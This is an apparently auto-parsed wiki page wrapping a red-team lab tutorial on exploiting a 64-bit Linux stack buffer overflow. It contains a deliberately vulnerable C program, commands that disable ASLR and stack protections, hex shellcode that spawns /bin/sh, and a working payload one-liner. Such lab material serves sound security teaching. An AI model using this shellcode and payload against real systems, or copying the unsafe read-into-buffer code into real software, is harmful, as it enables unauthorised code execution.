---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# 64-bit Stack-based Buffer Overflow

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-binary-exploitation-64-bit-stack-based-buffer-overflow` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [64-bit Stack-based Buffer Overflow](../../topics/offensive-security/64-bit-stack-based-buffer-overflow.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-binary-exploitation-64-bit-stack-based-buffer-overflow |
| name | 64-bit Stack-based Buffer Overflow |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow.md |

## Preserved Source Material

````yaml
_asset_filenames:
- image (898).png
- image (899).png
- image (900).png
- image (901).png
- image (902).png
- image (903).png
- x64-stack-overflow (1).gif
_body: "# 64-bit Stack-based Buffer Overflow\n\nThe purpose of this lab is to understand how to get control of the RIP register\
  \ when dealing with classic stack-based buffer overflow vulnerabilities in 64-bit Linux programs.\n\nThis lab is based on\
  \ a great post [https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/](https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/).\n\
  \n{% hint style=\"info\" %}\nNote that the vulnerable program used in this lab was compiled without memory protections deliberately\
  \ and similarly, the ASLR was disabled.\n{% endhint %}\n\n## Useful notes\n\nFor a more detailed overview of the stack based\
  \ overflow exploitation:\n\n{% content-ref url=\"stack-based-buffer-overflow.md\" %}\n[stack-based-buffer-overflow.md](stack-based-buffer-overflow.md)\n\
  {% endcontent-ref %}\n\nFor more information about the stack memory layout and calling convention for 64-bit Linux programs:\n\
  \n{% content-ref url=\"../../../miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame.md\"\
  \ %}\n[linux-x64-calling-convention-stack-frame.md](../../../miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame.md)\n\
  {% endcontent-ref %}\n\n## Vulnerable Code\n\nIn this lab, we will be using the below vulnerable program, which declares\
  \ a buffer `buf` of 80 bytes, but then allows writing 400 bytes to it, which when done, will overwrite stack's contents,\
  \ specifically, the RBP and the return address, which can and will be exploited in this lab:\n\n{% tabs %}\n{% tab title=\"\
  vulnerable.c\" %}\n```c\n// code from https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/\n\
  \n#include <stdio.h>\n#include <unistd.h>\n\nint vuln() {\n    char buf[80];\n    int r;\n    r = read(0, buf, 400);\n \
  \   printf(\"\\nRead %d bytes. buf is %s\\n\", r, buf);\n    puts(\"No shell for you :(\");\n    return 0;\n}\n\nint main(int\
  \ argc, char *argv[]) {\n    printf(\"Try to exec /bin/sh\");\n    vuln();\n    return 0;\n}\n```\n{% endtab %}\n{% endtabs\
  \ %}\n\n{% hint style=\"info\" %}\n**Remember about the stack**\n\n* Stack grows downwards\n* Local variables are defined\
  \ at lower stack addresses\n* Return address is located higher up in the stack, compared to local variables\n{% endhint\
  \ %}\n\nWe can compile the above code with:\n\n```python\ngcc -fno-stack-protector -z execstack vulnerable.c -o vulnerable\n\
  ```\n\n{% hint style=\"warning\" %}\nDon't forget to disable the ASLR:\n\n```\necho 0 > /proc/sys/kernel/randomize_va_space\n\
  ```\n{% endhint %}\n\n## Getting Control of RIP\n\nLet's try to overflow the program's `buf` buffer by sending some garbage\
  \ data to it. First of, let's generate the said garbage data - 200 AAAAs:\n\n```python\npython -c \"print 'A'*200\" > in.bin\n\
  ```\n\nLet's now run the vulnerable program, feed the garbage file to it and observe the program crash:\n\n```python\ngdb\
  \ vulnerable\nr < in.bin\n```\n\n![Vulnerable program crashes when the garbage is fed to it, but the RIP is not overwritten](<../../../.gitbook/assets/image\
  \ (902).png>)\n\nNote from the above screenshot the following key points:\n\n* The stack has been overflowed with As (lime);\n\
  * RIP register (red) has not been overflowed although it would have been, had this been a 32-bit binary. On the same note,\
  \ we can indeed see that the return address (RSP + 0 as `ret` instruction would pop this value and jump to it) has been\
  \ filled with `AAAA...`s, so why are we not in control of the RIP register?\n\n### Why is RIP not overflowed?\n\nThe reason\
  \ the RIP was not overflowed (technically it was, as we saw in the above screenshot, but there's more to it), is because\
  \ the `AAAAAAAA` (`0x4141414141414141`) is considered a non-canonical memory address, or, in other words, `0x4141414141414141`\
  \ is a 64-bit wide address and current CPUs prevent applications and OSes to use 64-bit wide addresses.&#x20;\n\nInstead,\
  \ the highest memory addresses programs can use are 48-bit wide addresses and they are capped to `0x00007FFFFFFFFFFF`. This\
  \ is done to prevent the unnecessary complexity in memory address translations that would not provide much benefit to the\
  \ OSes or applications as it's very unlikely they would ever need to use all of that 64-bit address space.&#x20;\n\n###\
  \ Finding RIP Offset\n\nKnowing about canonical addresses, we could take control of the RIP if the 64-bit wide return address\
  \ `0x4141414141414141` (our garbage data) we tried to plant into the vulnerable program's stack, was translated to a 48-bit\
  \ canonical address by masking off the 2 highest bytes:\n\n```python\n// WinDBG\n0:000> ? 0x4141414141414141 & 0x00007FFFFFFFFFFF\n\
  Evaluate expression: 71748523475265 = 00004141`41414141\n```\n\nMaking our garbage return address a valid canonical address\
  \ (note the 2 leading bytes are `00 00`):\n\n$$\n0x0000414141414141\n$$\n\nLet's see if we can make the program crash and\
  \ point the RIP to the now canonical memory address `0x0000414141414141`.\n\nBefore we can do this, we need to find out\
  \ how much garbage `AAA..` we need to send in to the vulnerable program before we can place `0x0000414141414141` onto the\
  \ stack, so that we can take over the RIP.\n\nIn gdb-peda, let's create a pattern of 200 characters:\n\n```python\ngdb-peda$\
  \ pattern_create 200\n'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'\n\
  ```\n\nFeed that pattern to the vulnerable program, observe the crash, and find the offset where we should place our preferred\
  \ RIP value (`0x0000414141414141`):\n\n![RIP offset is 104](<../../../.gitbook/assets/image (898).png>)\n\nFrom the above\
  \ screenshot, we can see that part of our pattern `A7AAMAAiA...` is visible at the top of the stack -  this value would\
  \ be popped from the stack and jumped to by the `ret` instruction. Now we need to know how many characters of the 200 bytes\
  \ pattern that we generated earlier were put on the stack, before `A7AAMAAiA` got placed at the top of the stack.\n\nBelow\
  \ screenshot illustrates the point outlined above:\n\n* 200 characters pattern string\n* In red, 104 bytes of garbage characters\n\
  * In cyan, the `A7AAMAAiA` - this is where we would place our arbitrary RIP value\n\n![104 bytes of garbage before we can\
  \ place an arbitrary RIP value on the stack](<../../../.gitbook/assets/image (903).png>)\n\nTo calculate the offset in gdb-peda,\
  \ we can use `pattern_offset` like so:\n\n```python\ngdb-peda$ pattern_offset A7AAMAAiA\nA7AAMAAiA found at offset: 104\n\
  ```\n\n### RIP is Under Control\n\nThe RIP offset as we've just identified is `104`. Let's test it by generating a new garbage\
  \ file that will now contain 104 `A` and a canonical return address `0x0000414141414141` (in reverse due to little-endianness):\n\
  \n```python\npython -c \"print 'A'*104 + '\\x41\\x41\\x41\\x41\\x41\\x41\\x00\\x00'\" > in.bin\n```\n\nSending this data\
  \ to the vulnerable program reveals that we have now taken control of the RIP register (lime):\n\n![We can now control RIP\
  \ as it points to 0x0000414141414141](<../../../.gitbook/assets/image (899).png>)\n\n## Exploitation\n\nWe'd like the vulnerable\
  \ program to spawn a shell for us when exploited, so we will place the [shellcode](http://shell-storm.org/shellcode/files/shellcode-806.php)\
  \ in the environment variable `PWN`, so it ends up in the vulnerable program's stack when it's executed, like so:\n\n```python\n\
  export PWN=`python -c 'print \"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\\
  x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\"'`\n```\n\n{% hint style=\"info\" %}\nNote that if you are trying to replicate\
  \ this in your lab and you would like the vulnerable program to spawn a root shell, you need to use the [shellcode](http://shell-storm.org/shellcode/files/shellcode-77.php)\
  \ that calls `setuid(0)` first. Thanks [@reveng007](https://twitter.com/reveng007).\n{% endhint %}\n\nWe now need to find\
  \ where on stack the `PWN` environment variable will be located in the vulnerable program. For this, we can use the following\
  \ program:\n\n{% tabs %}\n{% tab title=\"getenvvar.c\" %}\n```cpp\n// code by Jon Erickson, page 147 and 148 of Hacking:\
  \ The Art of Exploitation, 2nd Edition\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc,\
  \ char *argv[]) {\n\tchar *ptr;\n\n\tif(argc < 3) {\n\t\tprintf(\"Usage: %s <environment variable> <target program name>\\\
  n\", argv[0]);\n\t\texit(0);\n\t}\n\tptr = getenv(argv[1]); /* get env var location */\n\tptr += (strlen(argv[0]) - strlen(argv[2]))*2;\
  \ /* adjust for program name */\n\tprintf(\"%s will be at %p\\n\", argv[1], ptr);\n}\n```\n{% endtab %}\n{% endtabs %}\n\
  \nCompile it with:\n\n```\ngcc getenvvar.c -o getenvvar\n```\n\nThen run it like so:\n\n```python\n./getenvvar PWN ./vulnerable\n\
  ```\n\nNote that the `PWN` environment variable will be on the vulnerable program's stack at `0x7fffffffefa8`:\n\n![PWN\
  \ environment variable location on the stack in the vulnerable program](<../../../.gitbook/assets/image (900).png>)\n\n\
  Convert `0x7fffffffefa8` to its canonical (2 highest bytes masked off) form, which equals to `0x0000ffffefa8`. We can now\
  \ try to exploit the vulnerable program by sending the garbage data that now includes the `PWN` environment variable address\
  \ (that contains the shellcode that spawns a shell) as the return address at offset 104, like so:\n\n```python\n(python\
  \ -c \"print 'A'*104 + '\\xa8\\xef\\xff\\xff\\xff\\x7f\\x00\\x00'\"; cat) | ./vulnerable\n```\n\n![Vulnerable program is\
  \ exploited and results in a new shell](<../../../.gitbook/assets/x64-stack-overflow (1).gif>)\n\nTo confirm the exploit\
  \ worked as expected, we can `unset` the `PWN` environment variable and try to exploit the program again just to see the\
  \ program crash, since it no longer knows what shellcode to execute:\n\n![Exploit no longer works since shellcode is gone\
  \ from the PWN environment variable](<../../../.gitbook/assets/image (901).png>)\n\n## References\n\n{% embed url=\"https://www.ret2rop.com/2018/08/stack-based-buffer-overflow-x64.html\"\
  \ %}\n\n{% embed url=\"https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/\" %}\n\n{% embed\
  \ url=\"https://medium.com/@_neerajpal/explained-difference-between-x86-x64-disassembly-49e9678e1ae2\" %}\n\n[https://www.cs.tufts.edu/comp/40/docs/x64\\\
  _cheatsheet.pdf](https://www.cs.tufts.edu/comp/40/docs/x64\\_cheatsheet.pdf)"
_relative_path: offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow.md
````
